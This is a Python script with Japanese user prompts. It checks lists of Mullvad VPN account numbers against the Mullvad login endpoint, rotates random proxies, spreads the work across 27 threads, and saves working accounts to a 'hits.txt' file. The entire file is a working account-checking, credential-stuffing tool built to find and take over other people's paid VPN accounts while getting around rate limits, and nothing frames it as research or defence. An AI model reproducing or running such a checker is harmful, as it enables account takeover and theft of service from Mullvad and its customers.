import os
import time
import random
import colorama
import requests
import threading

class Mullvad:
    @staticmethod
    def check(proxy, key):
        try:
            response = requests.post(
                "https://mullvad.net/ja/account/login",
                headers={
                    "Accept": "application/json",
                    "Origin": "https://mullvad.net",
                    "Referer": "https://mullvad.net/ja/account/login",
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Sveltekit-Action": "true"
                },
                data={
                    "account_number": key
                },
                proxies={
                    "http": proxy,
                    "https": proxy
                }
            ).json()
        except:
            return "Exception"

        if response["status"] == 302:
            if "/account" in response["location"]:
                return "Is-Valid"
            else:
                return "Is-Invalid"
        elif response["status"] == 429:
            return "Rate-Limit"
        else:
            return "Is-Invalid"
        
class Slicer:
    @staticmethod
    def split(_array, part):
        avg_length = len(_array) // part
        remind = len(_array) % part

        result = []
        index = 0

        for i in range(part):
            size = avg_length + 1 if i < remind else avg_length
            result.append(_array[index:index + size])
            index += size

        return result

def check(proxies, keys):
    for key in keys:
        is_valid = False
        is_error = True
        
        for i in range(3):
            result = Mullvad.check(random.choice(proxies), key)
            if result == "Exception":
                time.sleep(5)
                continue
            elif result == "Rate-Limit":
                break
            elif result == "Is-Valid":
                is_valid = True
                is_error = False

                with open("hits.txt", "a", encoding="utf-8") as file:
                    file.write(f"{key}\n")

                break
            else:
                is_error = False
                break

        if is_valid:
            print(f"{colorama.Fore.GREEN}[HIT] {colorama.Fore.CYAN}{key}{colorama.Fore.RESET}")
        else:
            if is_error:
                print(f"{colorama.Fore.MAGENTA}[ERR] {colorama.Fore.RESET}{key}")
            else:
                print(f"{colorama.Fore.RED}[DEAD] {colorama.Fore.RESET}{key}")

def main():
    print(f"{colorama.Fore.MAGENTA}< キーが入ったファイルを指定してください >{colorama.Fore.RESET}")
    key_path = input("> ")
    print("\n")

    print(f"{colorama.Fore.MAGENTA}< プロキシが入ったファイルを指定してください >{colorama.Fore.RESET}")
    proxies_path = input("> ")
    print("\n")

    with open(key_path, "r", encoding="utf-8") as file:
        keys = file.read().split("\n")
    sliced_keys = Slicer.split(keys, 27)

    with open(proxies_path, "r", encoding="utf-8") as file:
        proxies = file.read().split("\n")

    threads = []

    for keys in sliced_keys:
        thread = threading.Thread(target=check, args=(proxies, keys,))
        threads.append(thread)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    print("\n")
    print(f"{colorama.Fore.GREEN}すべての処理が完了しました{colorama.Fore.RESET}")
    print("\n")

    os.system("pause")

if __name__ == "__main__":
    main()